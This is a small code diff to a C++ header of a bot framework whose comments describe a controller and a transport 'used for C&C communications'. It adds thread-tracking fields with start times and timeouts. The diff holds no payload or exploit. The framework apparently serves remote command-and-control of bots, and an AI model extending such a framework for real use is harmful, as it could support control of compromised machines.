@@ -7,6 +7,7 @@
 #include <map>
 #include <string>
 #include <memory>
+#include <thread>
 
 #ifdef _WIN32
 #include "windows.hpp"
@@ -17,6 +18,13 @@
 #endif
 
 namespace hivemind_lib {
+
+struct ThreadInfo{
+  std::thread thread;
+  time_t time_start;
+  long int timeout;
+};
+
 /**
  * @brief The "main" of the framework, orchestrates the function of the bot.
  */
@@ -34,6 +42,7 @@ class logic_controller {
    * @brief The transport, used for C&C communications
    */
   std::unique_ptr<Transport> transport;
+  std::vector<ThreadInfo> thread_infos;
 
  public:
   /**
